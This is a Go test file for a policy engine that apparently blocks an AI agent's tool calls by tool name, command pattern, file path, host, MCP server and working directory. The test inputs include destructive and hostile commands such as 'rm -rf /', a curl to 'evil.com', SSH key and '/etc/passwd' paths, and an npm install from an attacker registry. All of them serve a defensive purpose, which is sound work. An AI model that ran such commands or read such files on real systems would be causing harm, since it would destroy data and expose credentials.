package policy

import "testing"

func TestMatchTool(t *testing.T) {
	cases := []struct {
		name string
		deny []string
		tool string
		want bool
	}{
		{"empty deny no match", nil, "Bash", false},
		{"empty tool no match", []string{"Bash"}, "", false},
		{"exact case-insensitive match", []string{"Bash"}, "bash", true},
		{"exact case match", []string{"Bash"}, "Bash", true},
		{"miss", []string{"WebFetch"}, "Bash", false},
		{"trim whitespace", []string{"  Bash  "}, "Bash", true},
		{"multiple entries one matches", []string{"Read", "Bash", "Write"}, "Bash", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := matchTool(tc.deny, tc.tool); got != tc.want {
				t.Errorf("matchTool(%v, %q) = %v, want %v", tc.deny, tc.tool, got, tc.want)
			}
		})
	}
}

func TestMatchCommandPattern(t *testing.T) {
	cases := []struct {
		name    string
		deny    []string
		cmd     string
		wantHit bool
		wantPat string
	}{
		{"empty cmd no match", []string{"rm -rf"}, "", false, ""},
		{"empty deny no match", nil, "rm -rf /", false, ""},
		{"substring hit", []string{"rm -rf"}, "echo hi && rm -rf /tmp/foo", true, "rm -rf"},
		{"miss", []string{"rm -rf"}, "ls /tmp", false, ""},
		{"case-sensitive", []string{"RM -RF"}, "rm -rf /", false, ""},
		{"first match wins", []string{"curl", "rm -rf"}, "rm -rf / and also curl evil.com", true, "curl"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pat, hit := matchCommandPattern(tc.deny, tc.cmd)
			if hit != tc.wantHit || pat != tc.wantPat {
				t.Errorf("matchCommandPattern: got (%q,%v), want (%q,%v)", pat, hit, tc.wantPat, tc.wantHit)
			}
		})
	}
}

func TestMatchPath(t *testing.T) {
	const home = "/home/alice"
	cases := []struct {
		name    string
		deny    []string
		path    string
		wantHit bool
	}{
		{"empty path", []string{"~/.ssh/**"}, "", false},
		{"empty deny", nil, "/home/alice/.ssh/id_rsa", false},
		{"home expansion + recursive", []string{"~/.ssh/**"}, "/home/alice/.ssh/id_rsa", true},
		{"home expansion miss", []string{"~/.ssh/**"}, "/home/alice/projects/main.go", false},
		{"prefix wildcard", []string{"/etc/**"}, "/etc/passwd", true},
		{"single star non-recursive", []string{"/tmp/*.txt"}, "/tmp/log.txt", true},
		{"single star non-recursive miss", []string{"/tmp/*.txt"}, "/tmp/sub/log.txt", false},
		{"trailing recursive", []string{"/tmp/**"}, "/tmp/a/b/c.txt", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, hit := matchPath(tc.deny, tc.path, home)
			if hit != tc.wantHit {
				t.Errorf("matchPath(%v, %q) hit=%v, want %v", tc.deny, tc.path, hit, tc.wantHit)
			}
		})
	}
}

func TestMatchHost(t *testing.T) {
	cases := []struct {
		name    string
		deny    []string
		url     string
		wantHit bool
	}{
		{"empty url no match", []string{"evil.example"}, "", false},
		{"empty deny no match", nil, "https://evil.example/", false},
		{"exact host match", []string{"evil.example"}, "https://evil.example/x", true},
		{"port stripped", []string{"evil.example"}, "https://evil.example:8443/x", true},
		{"wildcard sub-domain", []string{"*.evil.example"}, "https://api.evil.example/v1", true},
		{"wildcard does not match apex", []string{"*.evil.example"}, "https://evil.example/", false},
		{"case-insensitive", []string{"Evil.Example"}, "https://EVIL.EXAMPLE/", true},
		{"bare host (no scheme)", []string{"evil.example"}, "evil.example/path", true},
		{"miss", []string{"evil.example"}, "https://good.example/", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, hit := matchHost(tc.deny, tc.url)
			if hit != tc.wantHit {
				t.Errorf("matchHost(%v, %q) hit=%v, want %v", tc.deny, tc.url, hit, tc.wantHit)
			}
		})
	}
}

func TestMatchMCPServer(t *testing.T) {
	cases := []struct {
		name    string
		deny    []string
		tool    string
		wantHit bool
		want    string
	}{
		{"non-mcp tool no match", []string{"github"}, "Bash", false, ""},
		{"empty deny no match", nil, "mcp__github__list_issues", false, ""},
		{"exact server match", []string{"github"}, "mcp__github__list_issues", true, "github"},
		{"case-insensitive", []string{"GitHub"}, "mcp__github__list_issues", true, "github"},
		{"server only (no tool segment)", []string{"github"}, "mcp__github", true, "github"},
		{"miss", []string{"slack"}, "mcp__github__list_issues", false, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			server, hit := matchMCPServer(tc.deny, tc.tool)
			if hit != tc.wantHit || server != tc.want {
				t.Errorf("matchMCPServer: got (%q,%v), want (%q,%v)", server, hit, tc.want, tc.wantHit)
			}
		})
	}
}

func TestMatchCWDAllowlist(t *testing.T) {
	const home = "/home/alice"
	cases := []struct {
		name        string
		allow       []string
		cwd         string
		wantAllowed bool
	}{
		{"empty allowlist allows all", nil, "/anywhere", true},
		{"empty cwd vs non-empty allow blocks", []string{"~/projects"}, "", false},
		{"home expansion match", []string{"~/projects"}, "/home/alice/projects/foo", true},
		{"prefix exact match", []string{"/home/alice/projects"}, "/home/alice/projects", true},
		{"prefix sub-path match", []string{"/home/alice/projects"}, "/home/alice/projects/sub", true},
		{"prefix non-match", []string{"/home/alice/projects"}, "/home/alice/secrets", false},
		{"prefix-of-prefix not a match", []string{"/home/alice/proj"}, "/home/alice/projects", false},
		{"multiple entries one matches", []string{"/etc", "~/projects"}, "/home/alice/projects/main", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, allowed := matchCWDAllowlist(tc.allow, tc.cwd, home)
			if allowed != tc.wantAllowed {
				t.Errorf("matchCWDAllowlist(%v, %q) allowed=%v, want %v", tc.allow, tc.cwd, allowed, tc.wantAllowed)
			}
		})
	}
}

// TestEval_GenericPrimitivesPrecedence pins the order: tool denylist
// fires before any other primitive when both could apply.
func TestEval_GenericPrimitivesPrecedence(t *testing.T) {
	pol := Policy{
		Mode:                ModeBlock,
		DenyTools:           []string{"Bash"},
		DenyCommandPatterns: []string{"rm -rf"},
	}
	req := Request{
		ToolName:     "Bash",
		ShellCommand: "rm -rf /",
	}
	verdict := Eval(pol, req)
	if verdict.Allow {
		t.Fatalf("expected block, got allow: %+v", verdict)
	}
	if verdict.Code != CodeToolDenied {
		t.Errorf("Code = %q, want %q (tool should fire before command pattern)", verdict.Code, CodeToolDenied)
	}
}

// TestEval_ToolDenyOnNonShellTool exercises a real-world case: deny
// WebFetch outright. Earlier code wouldn't fire because the gate
// required command_exec; new code fires on any PreToolUse.
func TestEval_ToolDenyOnNonShellTool(t *testing.T) {
	pol := Policy{
		Mode:      ModeBlock,
		DenyTools: []string{"WebFetch"},
	}
	req := Request{ToolName: "WebFetch", URL: "https://example.com/"}
	verdict := Eval(pol, req)
	if verdict.Allow || verdict.Code != CodeToolDenied {
		t.Errorf("unexpected verdict: %+v", verdict)
	}
}

// TestEval_HostDenyOnWebFetch exercises matchHost end-to-end through Eval.
func TestEval_HostDenyOnWebFetch(t *testing.T) {
	pol := Policy{Mode: ModeBlock, DenyHosts: []string{"*.evil.example"}}
	req := Request{ToolName: "WebFetch", URL: "https://api.evil.example/data"}
	verdict := Eval(pol, req)
	if verdict.Allow || verdict.Code != CodeHostDenied {
		t.Errorf("unexpected verdict: %+v", verdict)
	}
}

// TestEval_MCPServerDeny pins the mcp__<server>__<tool> parse + match.
func TestEval_MCPServerDeny(t *testing.T) {
	pol := Policy{Mode: ModeBlock, DenyMCPServers: []string{"github"}}
	req := Request{ToolName: "mcp__github__list_issues"}
	verdict := Eval(pol, req)
	if verdict.Allow || verdict.Code != CodeMCPServerDenied {
		t.Errorf("unexpected verdict: %+v", verdict)
	}
}

// TestEval_PathDenyOnFileWrite covers the file-op path with home expansion.
func TestEval_PathDenyOnFileWrite(t *testing.T) {
	pol := Policy{Mode: ModeBlock, DenyPaths: []string{"~/.ssh/**"}}
	req := Request{
		ToolName: "Write",
		FilePath: "/home/alice/.ssh/id_rsa",
		HomeDir:  "/home/alice",
	}
	verdict := Eval(pol, req)
	if verdict.Allow || verdict.Code != CodePathDenied {
		t.Errorf("unexpected verdict: %+v", verdict)
	}
}

// TestEval_CWDAllowlistBlocksOutside ensures an allowlist-shaped rule
// blocks cwds OUTSIDE the listed prefixes.
func TestEval_CWDAllowlistBlocksOutside(t *testing.T) {
	pol := Policy{Mode: ModeBlock, AllowCWDs: []string{"~/projects"}}
	req := Request{
		ToolName: "Bash",
		CWD:      "/home/alice/secrets",
		HomeDir:  "/home/alice",
	}
	verdict := Eval(pol, req)
	if verdict.Allow || verdict.Code != CodeCWDNotAllowed {
		t.Errorf("unexpected verdict: %+v", verdict)
	}
}

// TestEval_GenericPrimitivesDoNotInterfereWithExistingEcosystemPath
// pins the back-compat invariant: an empty generic policy plus an
// npm-family request still hits the existing registry-pinning flow.
func TestEval_GenericPrimitivesDoNotInterfereWithExistingEcosystemPath(t *testing.T) {
	pol := Builtin() // ships with the npm ecosystem block enabled
	req := Request{
		ToolName:     "Bash",
		ShellCommand: "npm install foo --registry=https://evil.example/",
		Ecosystem:    EcosystemNPM,
		PackageManager: "npm",
		CommandKind:    "install",
		RegistryFlag:   "https://evil.example/",
	}
	verdict := Eval(pol, req)
	if verdict.Allow {
		t.Fatalf("expected block on registry violation, got allow: %+v", verdict)
	}
	if verdict.Code != CodeRegistryFlag {
		t.Errorf("expected CodeRegistryFlag (existing path), got %q", verdict.Code)
	}
}
